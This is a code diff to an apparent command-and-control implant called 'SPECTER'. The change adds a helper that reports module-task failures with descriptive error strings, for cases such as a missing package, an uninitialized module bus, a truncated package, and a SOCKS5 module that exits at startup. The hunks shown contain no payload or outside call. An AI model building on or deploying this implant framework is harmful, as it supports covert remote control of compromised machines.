@@ -31,6 +31,8 @@
 
 static void store_task_failed_text(IMPLANT_CONTEXT *ctx, const char *task_id,
                                    const char *text, DWORD text_len);
+static void store_task_failed_cstr(IMPLANT_CONTEXT *ctx, const char *task_id,
+                                   const char *text);
 static DWORD task_b64_encode(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_max);
 
 #define SOCKS_INBOX_MAX_FRAMES 32u
@@ -690,7 +692,7 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     TASK_TRACE("[SPECTER] execute_module_task: enter");
     if (!task->data || task->data_len == 0) {
         TASK_TRACE("[SPECTER] execute_module_task: no data");
-        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        store_task_failed_cstr(ctx, task->task_id, "module task has no package data");
         return;
     }
 
@@ -698,7 +700,7 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     BUS_CONTEXT *bctx = (BUS_CONTEXT *)ctx->module_bus;
     if (!bctx || !bctx->initialized) {
         TASK_TRACE("[SPECTER] execute_module_task: bus not initialized");
-        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        store_task_failed_cstr(ctx, task->task_id, "module bus not initialized");
         return;
     }
 
@@ -706,7 +708,7 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     MODULE_MANAGER *mgr = modmgr_get();
     if (!mgr || !mgr->initialized) {
         TASK_TRACE("[SPECTER] execute_module_task: modmgr not initialized");
-        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        store_task_failed_cstr(ctx, task->task_id, "module manager not initialized");
         return;
     }
 
@@ -724,7 +726,7 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     TASK_TRACE("[SPECTER] execute_module_task: header parsed");
     if (!hdr) {
         TASK_TRACE("[SPECTER] execute_module_task: invalid package header");
-        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        store_task_failed_cstr(ctx, task->task_id, "module package header invalid");
         return;
     }
 
@@ -732,7 +734,7 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     DWORD actual_pkg_len = sizeof(MODULE_PACKAGE_HDR) + hdr->encrypted_size;
     if (actual_pkg_len > package_len) {
         TASK_TRACE("[SPECTER] execute_module_task: package truncated");
-        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        store_task_failed_cstr(ctx, task->task_id, "module package truncated");
         return;
     }
 
@@ -752,7 +754,7 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
 
     if (slot < 0) {
         TASK_TRACE("[SPECTER] execute_module_task: modmgr_execute failed");
-        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        store_task_failed_cstr(ctx, task->task_id, "module load failed before entrypoint");
         return;
     }
 
@@ -787,7 +789,8 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
                     store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
                 }
             } else {
-                store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+                store_task_failed_cstr(ctx, task->task_id,
+                                       "socks5 module exited during startup");
             }
             if (output_buf)
                 task_free(output_buf);
@@ -885,6 +888,15 @@ static void store_task_failed_text(IMPLANT_CONTEXT *ctx, const char *task_id,
     }
     spec_memcpy(buf, text, text_len);
     store_task_result(ctx, task_id, TASK_STATUS_FAILED, buf, text_len);
+}
+
+static void store_task_failed_cstr(IMPLANT_CONTEXT *ctx, const char *task_id,
+                                   const char *text) {
+    if (!text) {
+        store_task_result(ctx, task_id, TASK_STATUS_FAILED, NULL, 0);
+        return;
+    }
+    store_task_failed_text(ctx, task_id, text, spec_strlen(text));
 }
 
 static BOOL task_b64_decode(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_max, DWORD *out_len) {
